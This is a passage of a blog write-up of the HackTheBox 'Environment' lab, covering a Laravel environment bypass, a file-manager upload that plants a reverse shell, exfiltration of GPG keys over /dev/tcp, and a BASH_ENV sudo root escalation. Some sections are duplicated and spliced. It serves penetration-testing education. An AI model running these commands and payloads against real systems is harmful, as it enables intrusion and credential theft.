Server: nginx/1.22.1
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
Cache-Control: no-cache, private
date: Sun, 14 Sep 2025 14:46:49 GMT
Set-Cookie: laravel_session=eyJpdiI6Im9YL21JaEZsQ3l4OUpxaDRENFVEdEE9PSIsInZhbHVlIjoiNHlyU2FZQjRwMGgwV0dkckdSOEcyN21QMDFYR2RWYmpXbGpCSDA0Y0t3a0VMd3cwZ09WMCtmbXM3NnpuVGVuSFNudVdtem12TUFoczl5WmxDdWZnNU1LUFVISkgrOHpzUlB2dG9uanh6cDJpWExHeHdvLzFJUVVFV2RvdGN0OTAiLCJtYWMiOiJhYTdjYThiNWFhNmZiNmRhZWNmOWUyNTQ0ODZmNmY4YTkwOGMyNTA3YWQ5OThjYzViNzMxMTkzZjI3MmI4ZDc5IiwidGFnIjoiIn0%3D; expires=Sun, 14 Sep 2025 16:46:49 GMT; Max-Age=7200; path=/; httponly; samesite=lax

&lt;!DOCTYPE html&gt;
</code></pre>

<p>The rest of directories are 403 forbidden.</p>

<p>PHP and laravel versions were leaked in the “Method not allowed” page. Laravel version is 11.30.0.</p>

<p>Latest version of laravel as can be saw in github it’s 12.28.1, so our current version it’s outdated:</p>

<p><img src="/assets/images/Environment/Pasted%20image%2020250914174527.png" alt="image"></p>

<p>That version it’s vulnerable to <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-52301">CVE-2024-52301</a>, which allows to change environment used in laravel application by calling any URL with a special crafted query string.</p>

<p><a href="https://github.com/Nyamort/CVE-2024-52301">This page</a> explains it so well. I can change the laravel environment by adding the “?–env=&lt;environment&gt;”.</p>

<p>In the main page, if I try this, I can see the mode displayed in the footer changes:</p>

<p><img src="/assets/images/Environment/Pasted%20image%2020250914183822.png" alt="image"></p>

<p><img src="/assets/images/Environment/Pasted%20image%2020250914183902.png" alt="image"></p>

<p><img src="/assets/images/Environment/Pasted%20image%2020250914184051.png" alt="image"></p>

<p>For now, I can’t do more here.</p>
    
      <h1 id="code-analysis">
        
        
          Code analysis <a href="#code-analysis" class="anchor"><i class="fa fa-link" aria-hidden="true"></i></a>
        
        
      </h1>

<p>As saw before, an error in the application makes showing a debug page that contains code.</p>

<p>So to see the login page code as it’s one of the most importants here, I will make an error modifying the parameter names:</p>

<p><img src="/assets/images/Environment/Pasted%20image%2020250914185606.png" alt="image"></p>

<p>And I get the error page:</p>

<p><img src="/assets/images/Environment/Pasted%20image%2020250914185629.png" alt="image"></p>

<p>It shows lfm upload module in the top: <code>name('unisharp.lfm.upload')-&gt;middleware([AuthMiddleware::class]);</code>. But now, I can’t do nothing with it because I can’t upload nothing.</p>

<p>If the $keep_loggedin variable it’s different to <code>False</code>, it executes another block, so I will quit the parameter password to scroll down and see more code:</p>

<p><img src="/assets/images/Environment/Pasted%20image%2020250914191858.png" alt="image"></p>

<p>There’s nothing more than a comment in that block:</p>

<p><img src="/assets/images/Environment/Pasted%20image%2020250914192039.png" alt="image"></p>

<p>Now, I will change the remember parameter to another thing than False or True to scroll down more:</p>

<p><img src="/assets/images/Environment/Pasted%20image%2020250914192348.png" alt="image"></p>

<p><img src="/assets/images/Environment/Pasted%20image%2020250914192500.png" alt="image"></p>

<p>It shows that if the environment it’s set to preprod, it logins as administrator and redirects to <code>/management/dashboard</code>:</p>

<pre><code class="language-php">if(App::environment() == "preprod") { //QOL: login directly as me in dev/local/preprod envs
	$request-&gt;session()-&gt;regenerate();
	$request-&gt;session()-&gt;put('user_id', 1);
	return redirect('/management/dashboard');
}
</code></pre>

<p>And it’s possible to change it using the CVE-2024-52301 vulnerability!</p>

<p><img src="/assets/images/Environment/Pasted%20image%2020250914193052.png" alt="image"></p>

<p>And I get logged in!:</p>

<p><img src="/assets/images/Environment/Pasted%20image%2020250914193129.png" alt="image"></p>
    
      <h1 id="upload-exploit-shell-as-www-data">
        
        
          Upload exploit (shell as www-data) <a href="#upload-exploit-shell-as-www-data" class="anchor"><i class="fa fa-link" aria-hidden="true"></i></a>
        
        
      </h1>

<p>In the profile section, I can upload a profile picture:</p>

<p><img src="/assets/images/Environment/Pasted%20image%2020250914193429.png" alt="image"></p>

<p>I will select a random image and make an error to see the code:</p>

<p><img src="/assets/images/Environment/Pasted%20image%2020250914195515.png" alt="image"></p>

<p><img src="/assets/images/Environment/Pasted%20image%2020250914195605.png" alt="image"></p>

<p>Doesn’t work, here the error is well handled:</p>

<p><img src="/assets/images/Environment/Pasted%20image%2020250914195635.png" alt="image"></p>

<p>However, I saw before that it’s using unisharp lfm upload. Which is <a href="https://unisharp.github.io/laravel-filemanager/">laravel file manager</a>.</p>

<p>If I search for vulnerabilities, I can find <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-21546">CVE-2024-21546</a> which allows RCE.</p>

<blockquote>
  <p>Versions of the package unisharp/laravel-filemanager before 2.9.1 are vulnerable to Remote Code Execution (RCE) through using a valid mimetype and inserting the . character after the php file extension. This allows the attacker to execute malicious code.</p>
</blockquote>

<p>So I will try to upload a php file that shows phpinfo using a “.”, the same content-type that when I upload an image and the same magic bytes:</p>

<p><img src="/assets/images/Environment/Pasted%20image%2020250914201550.png" alt="image"></p>

<p>And it works!:</p>

<p><img src="/assets/images/Environment/Pasted%20image%2020250914201602.png" alt="image"></p>

<p>It shows some colors because I left some image bytes in the file. However, going to the page source, I can access the uploaded file path and see phpinfo:</p>

<p><img src="/assets/images/Environment/Pasted%20image%2020250914201700.png" alt="image"></p>

<p><img src="/assets/images/Environment/Pasted%20image%2020250914201723.png" alt="image"></p>

<p>Now I will upload one that gives me a reverse shell using <a href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php">this</a>:</p>

<pre><code class="language-bash">❯ nc -lvnp 443
listening on [any] 443 ...
</code></pre>

<p><img src="/assets/images/Environment/Pasted%20image%2020250914204728.png" alt="image"></p>

<p>Only uploading it, I receive the reverse shell, probably because it’s loaded in the profile page because of the img tag:</p>

<p><img src="/assets/images/Environment/Pasted%20image%2020250914204850.png" alt="image"></p>

<p>Now, I will do the <a href="/blog/tty-treatment.html">TTY treatment</a> to have a better shell:</p>

<p><img src="/assets/images/Environment/Pasted%20image%2020250919173205.png" alt="image">
<img src="/assets/images/Environment/Pasted%20image%2020250919173233.png" alt="image"></p>

<p>Flag is visible:</p>

<pre><code class="language-bash">www-data@environment:/$ cat /home/hish/user.txt 
dd****************************b5
</code></pre>
    
      <h1 id="privilege-escalation-to-hish-user">
        
        
          Privilege escalation to hish user <a href="#privilege-escalation-to-hish-user" class="anchor"><i class="fa fa-link" aria-hidden="true"></i></a>
        
        
      </h1>

<p>As the web application is made with laravel, the database configuration it’s stored in .env:</p>

<pre><code class="language-bash">www-data@environment:~/app$ ls -l .env
-rw-r--r-- 1 www-data www-data 1177 Jan 12  2025 .env
www-data@environment:~/app$ cat .env
APP_NAME=Laravel
APP_ENV=production
APP_KEY=base64:BRhzmLIuAh9UG8xXCPuv0nU799gvdh49VjFDvETwY6k=
APP_DEBUG=true
APP_TIMEZONE=UTC
APP_URL=http://environment.htb
APP_VERSION=1.1

APP_LOCALE=en
APP_FALLBACK_LOCALE=en
APP_FAKER_LOCALE=en_US

APP_MAINTENANCE_DRIVER=file
# APP_MAINTENANCE_STORE=database

PHP_CLI_SERVER_WORKERS=4

BCRYPT_ROUNDS=12

LOG_CHANNEL=stack
LOG_STACK=single
LOG_DEPRECATIONS_CHANNEL=null
LOG_LEVEL=debug

DB_CONNECTION=sqlite
# DB_HOST=127.0.0.1
# DB_PORT=3306
# DB_DATABASE=laravel
# DB_USERNAME=root
# DB_PASSWORD=

SESSION_DRIVER=database
SESSION_LIFETIME=120
SESSION_ENCRYPT=false
SESSION_PATH=/
SESSION_DOMAIN=null

BROADCAST_CONNECTION=log
FILESYSTEM_DISK=local
QUEUE_CONNECTION=database

CACHE_STORE=database
CACHE_PREFIX=

MEMCACHED_HOST=127.0.0.1

REDIS_CLIENT=phpredis
REDIS_HOST=127.0.0.1
REDIS_PASSWORD=null
REDIS_PORT=6379

MAIL_MAILER=log
MAIL_SCHEME=null
MAIL_HOST=127.0.0.1
MAIL_PORT=2525
MAIL_USERNAME=null
MAIL_PASSWORD=null
MAIL_FROM_ADDRESS="hello@example.com"
MAIL_FROM_NAME="${APP_NAME}"

AWS_ACCESS_KEY_ID=
AWS_SECRET_ACCESS_KEY=
AWS_DEFAULT_REGION=us-east-1
AWS_BUCKET=
AWS_USE_PATH_STYLE_ENDPOINT=false

VITE_APP_NAME="${APP_NAME}"
</code></pre>

<p>It uses sqlite for the database. Which it’s stored in database directory:</p>

<pre><code class="language-bash">www-data@environment:~/app$ cd database/
www-data@environment:~/app/database$ ls -l
total 120
-rw-r--r-- 1 www-data www-data 110592 Sep 20 02:10 database.sqlite
drwxr-xr-x 2 www-data www-data   4096 Apr  7 19:58 factories
drwxr-xr-x 2 www-data www-data   4096 Apr  7 19:58 migrations
drwxr-xr-x 2 www-data www-data   4096 Apr  7 19:58 seeders
</code></pre>
    
      <h2 id="inspect-database">
        
        
          Inspect database: <a href="#inspect-database" class="anchor"><i class="fa fa-link" aria-hidden="true"></i></a>
        
        
      </h2>

<pre><code class="language-bash">www-data@environment:~/app/database$ sqlite3 database.sqlite 
SQLite version 3.40.1 2022-12-28 14:03:47
Enter ".help" for usage hints.
sqlite&gt; 
</code></pre>

<p>Show tables:</p>

<pre><code class="language-bash">sqlite&gt; .tables
cache                  jobs                   sessions             
cache_locks            mailing_list           users                
failed_jobs            migrations           
job_batches            password_reset_tokens
</code></pre>

<p>Show columns of table users:</p>

<pre><code class="language-bash">sqlite&gt; pragma table_info(users);
0|id|INTEGER|1||1
1|name|varchar|1||0
2|email|varchar|1||0
3|email_verified_at|datetime|0||0
4|password|varchar|1||0
5|remember_token|varchar|0||0
6|created_at|datetime|0||0
7|updated_at|datetime|0||0
8|profile_picture|varchar|0||0
</code></pre>

<p>Select email, name and password from table users:</p>

<pre><code class="language-bash">sqlite&gt; SELECT name,email,password FROM users;
Hish|hish@environment.htb|$2y$12$QPbeVM.u7VbN9KCeAJ.JA.WfWQVWQg0LopB9ILcC7akZ.q641r1gi
Jono|jono@environment.htb|$2y$12$i.h1rug6NfC73tTb8XF0Y.W0GDBjrY5FBfsyX2wOAXfDWOUk9dphm
Bethany|bethany@environment.htb|$2y$12$6kbg21YDMaGrt.iCUkP/s.yLEGAE2S78gWt.6MAODUD3JXFMS13J.
</code></pre>

<p>These hashes seems to be encrypted with bcrypt:</p>

<pre><code class="language-bash">❯ hashid '$2y$12$QPbeVM.u7VbN9KCeAJ.JA.WfWQVWQg0LopB9ILcC7akZ.q641r1gi'
Analyzing '$2y$12$QPbeVM.u7VbN9KCeAJ.JA.WfWQVWQg0LopB9ILcC7akZ.q641r1gi'
[+] Blowfish(OpenBSD) 
[+] Woltlab Burning Board 4.x 
[+] bcrypt
</code></pre>

<p>I will write these hashes into a file and try to crack them with john:</p>

<pre><code class="language-bash">❯ vi users.hashes 
hish@environment.htb:$2y$12$QPbeVM.u7VbN9KCeAJ.JA.WfWQVWQg0LopB9ILcC7akZ.q641r1gi
jono@environment.htb:$2y$12$i.h1rug6NfC73tTb8XF0Y.W0GDBjrY5FBfsyX2wOAXfDWOUk9dphm
bethany@environment.htb:$2y$12$6kbg21YDMaGrt.iCUkP/s.yLEGAE2S78gWt.6MAODUD3JXFMS13J.
</code></pre>

<p>The hashes are not crackable as I tried it.</p>
    
      <h2 id="gpg-file">
        
        
          GPG file <a href="#gpg-file" class="anchor"><i class="fa fa-link" aria-hidden="true"></i></a>
        
        
      </h2>

<p>Backup folder in hish home accessible by www-data user:</p>

<pre><code class="language-bash">www-data@environment:/home/hish$ ls -la
total 36
drwxr-xr-x 5 hish hish 4096 Apr 11 00:51 .
drwxr-xr-x 3 root root 4096 Jan 12  2025 ..
lrwxrwxrwx 1 root root    9 Apr  7 19:29 .bash_history -&gt; /dev/null
-rw-r--r-- 1 hish hish  220 Jan  6  2025 .bash_logout
-rw-r--r-- 1 hish hish 3526 Jan 12  2025 .bashrc
drwxr-xr-x 4 hish hish 4096 Sep 20 01:40 .gnupg
drwxr-xr-x 3 hish hish 4096 Jan  6  2025 .local
-rw-r--r-- 1 hish hish  807 Jan  6  2025 .profile
drwxr-xr-x 2 hish hish 4096 Jan 12  2025 backup
-rw-r--r-- 1 root hish   33 Sep 19 20:02 user.txt
</code></pre>

<p>It contains a gpg encryption file:</p>

<pre><code class="language-bash">www-data@environment:/home/hish/backup$ ls -la
total 12
drwxr-xr-x 2 hish hish 4096 Jan 12  2025 .
drwxr-xr-x 5 hish hish 4096 Apr 11 00:51 ..
-rw-r--r-- 1 hish hish  430 Sep 20 01:41 keyvault.gpg
</code></pre>

<p>But I can’t decrypt it as I’m not hish and I don’t have permissions to create a .gnupg directory as www-data:</p>

<pre><code class="language-bash">www-data@environment:/home/hish/.gnupg$ gpg --decrypt keyvault.gpg
gpg: Fatal: can't create directory '/var/www/.gnupg': Permission deniedBackup folder in hish home:

```bash
www-data@environment:/home/hish$ ls -la
total 36
drwxr-xr-x 5 hish hish 4096 Apr 11 00:51 .
drwxr-xr-x 3 root root 4096 Jan 12  2025 ..
lrwxrwxrwx 1 root root    9 Apr  7 19:29 .bash_history -&gt; /dev/null
-rw-r--r-- 1 hish hish  220 Jan  6  2025 .bash_logout
-rw-r--r-- 1 hish hish 3526 Jan 12  2025 .bashrc
drwxr-xr-x 4 hish hish 4096 Sep 20 01:40 .gnupg
drwxr-xr-x 3 hish hish 4096 Jan  6  2025 .local
-rw-r--r-- 1 hish hish  807 Jan  6  2025 .profile
drwxr-xr-x 2 hish hish 4096 Jan 12  2025 backup
-rw-r--r-- 1 root hish   33 Sep 19 20:02 user.txt
</code></pre>

<p>It contains a gpg encryption file:</p>

<pre><code class="language-bash">www-data@environment:/home/hish/backup$ ls -la
total 12
drwxr-xr-x 2 hish hish 4096 Jan 12  2025 .
drwxr-xr-x 5 hish hish 4096 Apr 11 00:51 ..
-rw-r--r-- 1 hish hish  430 Sep 20 01:41 keyvault.gpg
</code></pre>

<p>But I can’t decrypt it as I’m not hish and I don’t have permissions to create a .gnupg directory as www-data:</p>

<pre><code class="language-bash">www-data@environment:/home/hish/.gnupg$ gpg --decrypt keyvault.gpg
gpg: Fatal: can't create directory '/var/www/.gnupg': Permission denied
</code></pre>

<p>However, I can transfer the files inside .gnupg folder to my machine and try to decrypt it:</p>
    
      <h3 id="keyvault-transfer">
        
        
          Keyvault transfer
        
        
      </h3>

<ul>
  <li>My machine:
    <pre><code class="language-bash">❯ nc -lvnp 443 &gt; keyvault.gpg
listening on [any] 443 ...
</code></pre>
  </li>
  <li>“Environment” machine:
    <pre><code class="language-bash">www-data@environment:/home/hish/backup$ cat keyvault.gpg &gt; /dev/tcp/10.10.14.175/443
</code></pre>
  </li>
</ul>
    
      <h3 id="gpg-home-files-transfer">
        
        
          GPG home files transfer
        
        
      </h3>

<ul>
  <li>My machine:
    <pre><code class="language-bash">❯ mkdir gpg-files
❯ cd gpg-files
❯ nc -lvnp 443 &gt; gpg-files.zip
listening on [any] 443 ...
</code></pre>
  </li>
  <li>“Environment machine”:
    <pre><code class="language-bash">www-data@environment:/home/hish/.gnupg$ zip -r /tmp/gpg-files.zip .
adding: private-keys-v1.d/ (stored 0%)
adding: private-keys-v1.d/C2DF4CF8B7B94F1EEC662473E275A0E483A95D24.key (deflated 41%)
adding: private-keys-v1.d/3B966A35D4A711F02F64B80E464133B0F0DBCB04.key (deflated 41%)
adding: trustdb.gpg (deflated 93%)
adding: pubring.kbx (deflated 6%)
adding: openpgp-revocs.d/ (stored 0%)
adding: openpgp-revocs.d/F45830DFB638E66CD8B752A012F42AE5117FFD8E.rev (deflated 37%)
adding: pubring.kbx~ (deflated 25%)
adding: random_seed (stored 0%)
www-data@environment:/home/hi### Decryptionsh/.gnupg$ cat /tmp/gpg-files.zip &gt; /dev/tcp/10.10.14.175/443
www-data@environment:/home/hish/.gnupg$ rm /tmp/gpg-files.zip
</code></pre>
  </li>
</ul>

<pre><code class="language-bash">❯ unzip gpg-files.zip
Archive:  gpg-files.zip
   creating: private-keys-v1.d/
  inflating: private-keys-v1.d/C2DF4CF8B7B94F1EEC662473E275A0E483A95D24.key  
  inflating: private-keys-v1.d/3B966A35D4A711F02F64B80E464133B0F0DBCB04.key  
  inflating: trustdb.gpg             
  inflating: pubring.kbx             
   creating: openpgp-revocs.d/
  inflating: openpgp-revocs.d/F45830DFB638E66CD8B752A012F42AE5117FFD8E.rev  
  inflating: pubring.kbx~            
 extracting: random_seed             
❯ rm gpg-files.zip
</code></pre>
    
      <h3 id="decryption">
        
        
          Decryption
        
        
      </h3>

<p>Decrypt using the gpg files from hish directory:</p>

<pre><code class="language-bash">❯ gpg --homedir gpg-files --decrypt keyvault.gpg
gpg: WARNING: unsafe permissions on homedir '/home/gabri/Desktop/HackTheBox/machines/Environment-10.10.11.67/content/gpg-files'
gpg: encrypted with 2048-bit RSA key, ID B755B0EDD6CFCFD3, created 2025-01-11
      "hish_ &lt;hish@environment.htb&gt;"
PAYPAL.COM -&gt; Ihaves0meMon$yhere123
ENVIRONMENT.HTB -&gt; marineSPm@ster!!
FACEBOOK.COM -&gt; summerSunnyB3ACH!!
</code></pre>

<p>It was successfull and it leaks three passwords. As it’s supposed to be of hish user, I will try to use the “environment.htb” password as him/her:</p>

<pre><code class="language-bash">www-data@environment:/home/hish$ su hish
Password: marineSPm@ster!!
bash-5.2$ whoami
hish
</code></pre>

<p>And it worked!</p>
    
      <h1 id="privilege-escalation-to-root">
        
        
          Privilege escalation to root <a href="#privilege-escalation-to-root" class="anchor"><i class="fa fa-link" aria-hidden="true"></i></a>
        
        
      </h1>

<p>Hish has sudo privileges to execute as any user the command <code>systeminfo</code>:</p>

<pre><code class="language-bash">bash-5.2$ sudo -l
[sudo] password for hish: marineSPm@ster!!
Matching Defaults entries for hish on environment:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+="ENV BASH_ENV", use_pty

User hish may run the following commands on environment:
    (ALL) /usr/bin/systeminfo
</code></pre>

<p>As expected, when executed it gives some system information:</p>

<pre><code class="language-bash">bash-5.2$ sudo /usr/bin/systeminfo 

### Displaying kernel ring buffer logs (dmesg) ###
[    5.626913] Console: switching to colour frame buffer device 160x50
[    5.628774] vmwgfx 0000:00:0f.0: [drm] fb0: vmwgfxdrmfb frame buffer device
[    5.775290] NET: Registered PF_VSOCK protocol family
[    5.956458] auditfilter: audit rule for LSM 'crond_t' is invalid
[    5.956523] auditfilter: audit rule for LSM 'crond_t' is invalid
[    6.038969] vmxnet3 0000:03:00.0 eth0: intr type 3, mode 0, 3 vectors allocated
[    6.044637] vmxnet3 0000:03:00.0 eth0: NIC Link is Up 10000 Mbps
[ 6160.787700] perf: interrupt took too long (2630 &gt; 2500), lowering kernel.perf_event_max_sample_rate to 76000
[ 8498.749069] perf: interrupt took too long (3293 &gt; 3287), lowering kernel.perf_event_max_sample_rate to 60500
[15628.655135] perf: interrupt took too long (4142 &gt; 4116), lowering kernel.perf_event_max_sample_rate to 48250

### Checking system-wide open ports ###
State        Recv-Q       Send-Q             Local Address:Port             Peer Address:Port       Process                                                                             
LISTEN       0            5                        0.0.0.0:8000                  0.0.0.0:*           users:(("python3",pid=4257,fd=3))                                                  
LISTEN       0            511                      0.0.0.0:80                    0.0.0.0:*           users:(("nginx",pid=855,fd=5),("nginx",pid=854,fd=5),("nginx",pid=853,fd=5))       
LISTEN       0            128                      0.0.0.0:22                    0.0.0.0:*           users:(("sshd",pid=850,fd=3))                                                      
LISTEN       0            511                         [::]:80                       [::]:*           users:(("nginx",pid=855,fd=6),("nginx",pid=854,fd=6),("nginx",pid=853,fd=6))       
LISTEN       0            128                         [::]:22                       [::]:*           users:(("sshd",pid=850,fd=4))                                                      

### Displaying information about all mounted filesystems ###
sysfs        on  /sys                                                 type  sysfs        (rw,nosuid,nodev,noexec,relatime)
proc         on  /proc                                                type  proc         (rw,relatime,hidepid=invisible)
udev         on  /dev                                                 type  devtmpfs     (rw,nosuid,relatime,size=1980752k,nr_inodes=495188,mode=755,inode64)
devpts       on  /dev/pts                                             type  devpts       (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=000)
tmpfs        on  /run                                                 type  tmpfs        (rw,nosuid,nodev,noexec,relatime,size=400920k,mode=755,inode64)
/dev/sda1    on  /                                                    type  ext4         (rw,relatime,errors=remount-ro)
securityfs   on  /sys/kernel/security                                 type  securityfs   (rw,nosuid,nodev,noexec,relatime)
tmpfs        on  /dev/shm                                             type  tmpfs        (rw,nosuid,nodev,inode64)
tmpfs        on  /run/lock                                            type  tmpfs        (rw,nosuid,nodev,noexec,relatime,size=5120k,inode64)
cgroup2      on  /sys/fs/cgroup                                       type  cgroup2      (rw,nosuid,nodev,noexec,relatime,nsdelegate,memory_recursiveprot)
pstore       on  /sys/fs/pstore                                       type  pstore       (rw,nosuid,nodev,noexec,relatime)
bpf          on  /sys/fs/bpf                                          type  bpf          (rw,nosuid,nodev,noexec,relatime,mode=700)
systemd-1    on  /proc/sys/fs/binfmt_misc                             type  autofs       (rw,relatime,fd=30,pgrp=1,timeout=0,minproto=5,maxproto=5,direct,pipe_ino=13863)
mqueue       on  /dev/mqueue                                          type  mqueue       (rw,nosuid,nodev,noexec,relatime)
hugetlbfs    on  /dev/hugepages                                       type  hugetlbfs    (rw,relatime,pagesize=2M)
tracefs      on  /sys/kernel/tracing                                  type  tracefs      (rw,nosuid,nodev,noexec,relatime)
debugfs      on  /sys/kernel/debug                                    type  debugfs      (rw,nosuid,nodev,noexec,relatime)
configfs     on  /sys/kernel/config                                   type  configfs     (rw,nosuid,nodev,noexec,relatime)
fusectl      on  /sys/fs/fuse/connections                             type  fusectl      (rw,nosuid,nodev,noexec,relatime)
ramfs        on  /run/credentials/systemd-sysusers.service            type  ramfs        (ro,nosuid,nodev,noexec,relatime,mode=700)
ramfs        on  /run/credentials/systemd-sysctl.service              type  ramfs        (ro,nosuid,nodev,noexec,relatime,mode=700)
ramfs        on  /run/credentials/systemd-tmpfiles-setup-dev.service  type  ramfs        (ro,nosuid,nodev,noexec,relatime,mode=700)
ramfs        on  /run/credentials/systemd-tmpfiles-setup.service      type  ramfs        (ro,nosuid,nodev,noexec,relatime,mode=700)
binfmt_misc  on  /proc/sys/fs/binfmt_misc                             type  binfmt_misc  (rw,nosuid,nodev,noexec,relatime)
tmpfs        on  /run/user/1000                                       type  tmpfs        (rw,nosuid,nodev,relatime,size=400916k,nr_inodes=100229,mode=700,uid=1000,gid=1000,inode64)

### Checking system resource limits ###
real-time non-blocking time  (microseconds, -R) unlimited
core file size              (blocks, -c) 0
data seg size               (kbytes, -d) unlimited
scheduling priority                 (-e) 0
file size                   (blocks, -f) unlimited
pending signals                     (-i) 15474
max locked memory           (kbytes, -l) 501144
max memory size             (kbytes, -m) unlimited
open files                          (-n) 1024
pipe size                (512 bytes, -p) 8
POSIX message queues         (bytes, -q) 819200
real-time priority                  (-r) 0
stack size                  (kbytes, -s) 8192
cpu time                   (seconds, -t) unlimited
max user processes                  (-u) 15474
virtual memory              (kbytes, -v) unlimited
file locks                          (-x) unlimited

### Displaying loaded kernel modules ###
Module                  Size  Used by
tcp_diag               16384  0
inet_diag              24576  1 tcp_diag
vsock_loopback         16384  0
vmw_vsock_virtio_transport_common    53248  1 vsock_loopback
binfmt_misc            28672  1
vmw_vsock_vmci_transport    36864  1
intel_rapl_msr         20480  0
vsock                  53248  5 vmw_vsock_virtio_transport_common,vsock_loopback,vmw_vsock_vmci_transport
intel_rapl_common      32768  1 intel_rapl_msr

### Checking disk usage for all filesystems ###
Filesystem      Size  Used Avail Use% Mounted on
udev            1.9G     0  1.9G   0% /dev
tmpfs           392M  688K  391M   1% /run
/dev/sda1       3.8G  1.7G  2.0G  46% /
tmpfs           2.0G     0  2.0G   0% /dev/shm
tmpfs           5.0M     0  5.0M   0% /run/lock
tmpfs           392M     0  392M   0% /run/user/1000
</code></pre>

<p>The executable it’s a bash script:</p>

<pre><code class="language-bash">bash-5.2$ file /usr/bin/systeminfo 
/usr/bin/systeminfo: Bourne-Again shell script, ASCII text executable
</code></pre>

<p>And it executes some commands to show the system information:</p>

<pre><code class="language-bash">bash-5.2$ cat /usr/bin/systeminfo 
#!/bin/bash
echo -e "\n### Displaying kernel ring buffer logs (dmesg) ###"
dmesg | tail -n 10

echo -e "\n### Checking system-wide open ports ###"
ss -antlp

echo -e "\n### Displaying information about all mounted filesystems ###"
mount | column -t

echo -e "\n### Checking system resource limits ###"
ulimit -a

echo -e "\n### Displaying loaded kernel modules ###"
lsmod | head -n 10

echo -e "\n### Checking disk usage for all filesystems ###"
df -h
</code></pre>

<p>Can’t do nothing useful with that. Also, it’s set on sudo privileges a env_keep flag:</p>

<p><img src="/assets/images/Environment/Pasted%20image%2020250919191936.png" alt="image"></p>

<p>The <code>env_keep</code> flag means that it preserves the user outside sudo context specified environment variables when executing inside sudo context (from <code>man sudoers</code>):</p>

<p><img src="/assets/images/Environment/Pasted%20image%2020250919192119.png" alt="image"></p>

<p>So hish sudo privileges allows preserving the ENV and BASH_ENV from hish context.</p>

<p>According to <a href="https://www.shell-tips.com/bash/environment-variables/#the-shell-init-file-variables-env-and-bash_env">shell tips</a>, the BASH_ENV variable is used by bash to define an init file to execute after the executed command:</p>

<p><img src="/assets/images/Environment/Pasted%20image%2020250919193245.png" alt="image"></p>

<p>So, I will create a <code>init-file</code> in <code>/tmp</code> to later store it in <code>BASH_ENV</code> environment variable and execute what I want inside sudo context. In my case I will copy bash to <code>/tmp</code> and give it SUID permissions:</p>

<pre><code class="language-bash">bash-5.2$ nano /tmp/init-file
#!/bin/bash

cp /bin/bash /tmp/bash
chmod u+s /tmp/bash
bash-5.2$ chmod +x /tmp/init-file
</code></pre>

<pre><code class="language-bash">bash-5.2$ BASH_ENV=/tmp/init-file sudo /usr/bin/systeminfo
[..snip..]
</code></pre>

<p>It successfully copied the bash with SUID privileges:</p>

<pre><code class="language-bash">bash-5.2$ ls -l /tmp/bash 
-rwsr-xr-x 1 root root 1265648 Sep 20 03:49 /tmp/bash
</code></pre>

<p>To be root, it’s only needed to execute <code>/tmp/bash -p</code>:</p>

<pre><code class="language-bash">bash-5.2$ /tmp/bash -p
bash-5.2# whoami
root
</code></pre>

<p>And finally, it’s possible to view root flag:</p>

<pre><code class="language-bash">bash-5.2# cd /root/
bash-5.2# cat root.txt 
fb****************************71
</code></pre>



<div id="share-links">
  <span id="divider-line">____</span>
  <br><br>
  <small>19 September 2025</small>
  <div>
    
    Tags:
    
    <a href="/search?q=laravel" class="tag" style="font-family: 'Cascadia Code';">laravel</a>
    
    <a href="/search?q=cve-2024-52301" class="tag" style="font-family: 'Cascadia Code';">cve-2024-52301</a>
    
    <a href="/search?q=laravel-environment" class="tag" style="font-family: 'Cascadia Code';">laravel-environment</a>
    
    <a href="/search?q=cve-2024-21546" class="tag" style="font-family: 'Cascadia Code';">cve-2024-21546</a>
    
    <a href="/search?q=gpg-decrypt" class="tag" style="font-family: 'Cascadia Code';">gpg-decrypt</a>
    
    <a href="/search?q=bash_env-variable" class="tag" style="font-family: 'Cascadia Code';">bash_env-variable</a>
    
    <a href="/search?q=sudoers" class="tag" style="font-family: 'Cascadia Code';">sudoers</a>
    
    
</div>
  <br>
  Share this writeup: 
  <a href="javascript:window.open('https://www.facebook.com/sharer.php?u=http://localhost:4000/writeups/HTB/Environment.html','Windows','width=650,height=350,toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,directories=no,status=no')"><i class="fa fa-facebook-official" aria-hidden="true"></i></a> 
  <a href="javascript:window.open('https://twitter.com/intent/tweet?url=http://localhost:4000/writeups/HTB/Environment.html&amp;text=Writeup+for+HTB%20Environment%20writeup+from+HTB+held+on+19%20September%202025&amp;hashtags=ctf,writeup,Environment,HTB,laravel,cve-2024-52301,laravel-environment,cve-2024-21546,gpg-decrypt,bash_env-variable,sudoers','Windows','width=600,height=500,toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,directories=no,status=no')"><i class="fa fa-twitter" aria-hidden="true"></i></a> 
  <a href="javascript:window.open('https://www.linkedin.com/sharing/share-offsite/?url=http://localhost:4000/writeups/HTB/Environment.html&amp;text=Writeup+for+HTB%20Environment%20writeup+from+HTB+held+on+2025-09-19%2000:00:00%20+0200','Windows','width=650,height=350,toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,directories=no,status=no')"><i class="fa fa-linkedin" aria-hidden="true"></i></a>
</div>
    </section>
  </div>

  <div id="comments" class="container">
    <section id="disqus_container">
      
    </section>
  </div>

  <footer>
    <div class="social d-flex flex-column justify-content-center w-100">
    <a href="/search" class="text-center w-100 mt-3 mb-2">
      <i class="fa fa-sm fa-search"></i>
    </a>
    <div class="social-links-bar d-flex justify-content-center mb-2">
        
        
        <a href="https://github.com/GabrielGonzalez211" target="_blank" rel="noopener">
            <i class="fab fa-lg fa-github" aria-hidden="true"></i>
        </a>
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
    </div>
    
    <div class="htb_badge d-flex justify-content-center">
        
        <script src="https://www.hackthebox.eu/badge/831031"></script>
        
    </div>
    <div class="thm_badge">
        
    </div>
    
</div>

  </footer>

  <script src="http://localhost:4000/assets/js/prism.js"></script>
  <button onclick="topFunction()" class="fa fa-arrow-up" id="top" title="Go to top"></button>
  <script>
    topScroll = document.getElementById("top");

    window.onscroll = function () { scrollFunction() };

    function scrollFunction() {
      if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
        topScroll.style.display = "block";
      } else {
